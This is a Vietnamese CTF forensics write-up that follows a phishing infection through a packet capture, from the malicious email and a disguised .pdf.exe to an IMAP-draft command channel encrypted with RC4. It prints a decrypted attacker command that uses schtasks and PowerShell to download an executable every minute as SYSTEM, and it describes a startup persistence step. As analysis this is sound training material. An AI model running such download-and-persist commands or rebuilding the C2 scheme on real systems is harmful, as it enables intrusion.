# Mô tả
A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers' and system administrators' computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it's too late.

# Bài cho ta 6 flag cần phải tìm

# Phân tích
Bài cho ta một file `pcap`, qua phân tích file ta nhận thấy rằng phần lớn các giao tiếp xảy ra giữa 2 địa chỉ `192.168.91.173` và `192.168.91.173` 

![image](https://github.com/user-attachments/assets/84209cf0-5fe3-45fc-98ef-8a22b9b900b0)

Vậy quay lại wireshark và filter = `ip.src == 192.168.91.173 && ip.dst == 192.168.91.133` sẽ cho ta thấy đây là các request đọc, gửi email qua protocol HTTP

![image](https://github.com/user-attachments/assets/6334ee92-0c4f-4309-a67e-3591b2ebdce2)

Đến đây và qua các yêu cầu của flag thì đã khá chắc rằng người dùng đã bị hacker tấn công qua một phần mềm độc hại được gửi email, vậy ta sẽ phải follow các HTTP streams để tìm xem email và phần mềm đó là gì

Khi follow các stream thì để dễ nhìn hơn ta có thể sử dụng nút `Save as...` và lưu file xuất dưới dạng `html` vì phần lớn các stream đều là người dùng đang xem email trên web, như stream1 thì người dùng đang ở phần inbox

![image](https://github.com/user-attachments/assets/6e66f9ad-d580-4f43-844d-04cb4829b72d)

Đây là stream1 sau khi xuất ra file html

![image](https://github.com/user-attachments/assets/b991dbb4-79ac-46f7-a9fb-11bc893fa59c)

# Flag1: What is the subject of the first email that the victim opened and replied to?
Cái này không liên quan đến file chứa mã độc, chỉ là câu hỏi về email đầu tiên được người dùng mở ra xdd, sau đoạn này tốn khá nhiều thời gian phân tích cái file `jpg` trong mail này nhưng thực ra file chứa mã độc ở chỗ khác

Email đầu tiên được mở sẽ nằm ở stream4, không cần phải xuất từng stream một ra html đâu, có các biểu hiện khá rõ về chức năng đang được người dùng sử dụng như ở ảnh này đang là tiêu đề email(các stream1,2,3 không có)

![image](https://github.com/user-attachments/assets/6b8bf70e-c939-465e-a783-688ae00a1530)

![image](https://github.com/user-attachments/assets/6cd12f3f-24ad-4135-8944-ce618953fdca)

`Game Crash on Level 5`

# Flag2: On what date and time was the suspicious email sent?
Đây mới đến đoạn email chứa mã độc, tìm đến stream8 người dụng nhận được một email khác là `Bug report` kèm với một file `zip`, khá chắc chắn đây mới là mail đúng và nhập thời gian vào thì đúng thật

![image](https://github.com/user-attachments/assets/ff94a2ec-9dee-4595-9734-6ca830c22e99)

`2025-02-24_15:46`

# Flag3: What is the MD5 hash of the malware file?
Vẫn ở stream8 biết được rằng file đó tên là `Eldoria_Balance_Issue_Report.zip` và mật khẩu của nó `eldoriaismylife`

![image](https://github.com/user-attachments/assets/6510467d-dc1c-4256-bb04-df4523d01469)

Đến stream12 là lúc người dùng tải file này về máy. Thấy một điều rất lạ là file có đuôi `.pdf.exe` khả năng rất cao sẽ chứa mã độc rồi, giờ cần phải xuất file ra máy của mình tại stream12 = `File/export objects/HTTP/Content Type: application/zip/Save` sau đó lưu file thành `file.zip` để lưu về máy

https://osqa-ask.wireshark.org/questions/46389/capturing-packets-and-extracting-files-from-pcap/

![image](https://github.com/user-attachments/assets/0636a7cf-05e3-448e-aafa-f30b228546d6)

![image](https://github.com/user-attachments/assets/0bc08cc8-e504-4c1c-a43c-c9b30a43b153)

Sau đó giải nén `file.zip` và chạy `md5sum eldoria....pdf.exe` để ra mã hash md5

```
$ md5sum Eldoria_Balance_Issue_Report.pdf.exe
c0b37994963cc0aadd6e78a256c51547  Eldoria_Balance_Issue_Report.pdf.exe
```
`c0b37994963cc0aadd6e78a256c51547`

# Flag4: What credentials were used to log into the attacker's mailbox?
Đưa vào DiE biết được đây là 1 file C# vậy chỉ cần đưa vào dotPeek để tìm hiểu

![image](https://github.com/user-attachments/assets/e12a664e-2d8d-401f-8791-128584efe924)

![image](https://github.com/user-attachments/assets/0038421f-f59b-41eb-86f2-d96a5e6c4c98)

Ngay class đầu tiên ta đã thấy creds của hacker

`proplayer@email.com:completed`

# Flag5: What is the name of the task scheduled by the attacker?
File độc trên, nói chung là sẽ kết nối đến `mail.korptech.net` tại port143(IMAP), đăng nhập với `creds` và `r_creds`, tìm tiêu đề mail trong mục Draft, lấy nội dung mail, Giải mã lệnh được mã hoá và thực hiện qua `cmd.exe` rồi mã hoá kết quả của lệnh và gửi cho hacker qua email

Các payload được mã hoá dưới dạng base64+hardcoded RC4 key nên không dễ dàng decode base64 như bình thường được 

Vậy mỗi khi hacker muốn thực hiện lệnh nào đó trên máy của người dùng thì sẽ tạo 1 email, lưu nó vào mục Draft và `email.exe` sẽ thực hiện lệnh đó và gửi về email của hacker

Muốn biết hacker đã lên lịch task nào ta cần tìm ra email chứa payload dưới dạng base64 và decrypt nó, nhớ chatgpt tạo script decrypt

``` py
import base64

def rc4(key: bytes, data: bytes) -> bytes:
    """RC4 decryption implementation."""
    S = list(range(256))
    j = 0
    out = bytearray()
    
    # Key-scheduling algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # Pseudo-random generation algorithm (PRGA)
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    
    return bytes(out)

# The RC4 key (Replace with the actual key used for encryption)
key = bytes([
    168, 115, 174, 213, 168, 222, 72, 36, 91, 209, 242, 128, 69, 99, 195, 164,
    238, 182, 67, 92, 7, 121, 164, 86, 121, 10, 93, 4, 140, 111, 248, 44,
    30, 94, 48, 54, 45, 100, 184, 54, 28, 82, 201, 188, 203, 150, 123, 163,
    229, 138, 177, 51, 164, 232, 86, 154, 179, 143, 144, 22, 134, 12, 40, 243,
    55, 2, 73, 103, 99, 243, 236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
    111, 240, 108, 86, 85, 63, 44, 49, 241, 6, 3, 170, 131, 150, 53, 49,
    126, 72, 60, 36, 144, 248, 55, 10, 241, 208, 163, 217, 49, 154, 206, 227,
    25, 99, 18, 144, 134, 169, 237, 100, 117, 22, 11, 150, 157, 230, 173, 38,
    72, 99, 129, 30, 220, 112, 226, 56, 16, 114, 133, 22, 96, 1, 90, 72,
    162, 38, 143, 186, 35, 142, 128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
    246, 232, 205, 236, 254, 152, 145, 98, 126, 29, 217, 74, 177, 142, 19, 190,
    182, 151, 233, 157, 76, 74, 104, 155, 79, 115, 5, 18, 204, 65, 254, 204,
    118, 71, 92, 33, 58, 112, 206, 151, 103, 179, 24, 164, 219, 98, 81, 6,
    241, 100, 228, 190, 96, 140, 128, 1, 161, 246, 236, 25, 62, 100, 87, 145,
    185, 45, 61, 143, 52, 8, 227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
    227, 9, 146, 156, 208, 206, 194, 134, 194, 23, 233, 100, 38, 158, 58, 159
])

# Example encrypted data (Replace with actual encrypted base64 string)
encrypted_base64 = "PAYLOAD_BASE64"
encrypted_data = base64.b64decode(encrypted_base64)

# Decrypt the data
decrypted_data = rc4(key, encrypted_data)
decrypted_text = decrypted_data.decode(errors='ignore')  # Use UTF-8 or other encoding

print("Decrypted Text:", decrypted_text)

```
Tác giả cũng có một cách khác khá hay là dùng cyber chef, có lựa chọn dùng rc4 key với passphrase để decode base64

Sau đó đổi sang theo dõi tcp stream để xem rõ các payload được gửi đi, ví dụ như tcp stream16 có 2 payload

![image](https://github.com/user-attachments/assets/e56d6a80-300b-4202-bede-0e5f5948a7e3)

Khi dịch ra sẽ chạy 2 lệnh là `whoami` và đưa `email.exe` vào phần startup để chạy mỗi khi mở máy

Tìm tiếp đến tcp stream34 sẽ thấy một đoạn base64 nữa và đây chính là flag4

```
Decrypted Text: schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM
```

Để lập lịch một tác vụ dùng `cmd.exe` có thể dùng lệnh `schtasks`

Payload này tải một file `rakalam.exe` về máy và lưu vào thư mục Temp, truy theo đường link thì file đã bị xoá, theo lời tác giả: `The URL is no longer active, preventing us from determining exactly what was downloaded onto the victim's system. However, based on the malware's behavior, it is likely that the downloaded file served as another persistence mechanism.`

`Synchronization`

# Flag6: What is the API key leaked from the highly valuable file discovered by the attacker?
Tìm đến tcp stream97 ta được flag6

![image](https://github.com/user-attachments/assets/f2c7f027-a83a-44d2-a02b-7dbfa8e6894a)

`sk-3498fwe09r8fw3f98fw9832fw`
